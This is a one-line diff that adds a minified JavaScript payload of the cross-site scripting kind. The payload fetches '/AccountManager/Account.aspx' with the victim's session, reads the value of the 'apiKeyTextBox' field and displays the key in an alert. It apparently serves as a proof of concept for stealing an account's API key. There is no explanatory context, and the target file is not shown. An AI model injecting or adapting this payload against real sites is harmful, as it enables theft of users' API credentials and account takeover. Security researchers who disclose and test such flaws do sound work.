@@ -1,0 +1,1 @@
+var rq=new XMLHttpRequest;rq.onreadystatechange=function(){4==rq.readyState&&200==rq.status&&alert(rq.response.getElementById("apiKeyTextBox").value)},rq.open("GET","/AccountManager/Account.aspx",!0),rq.responseType="document",rq.send();
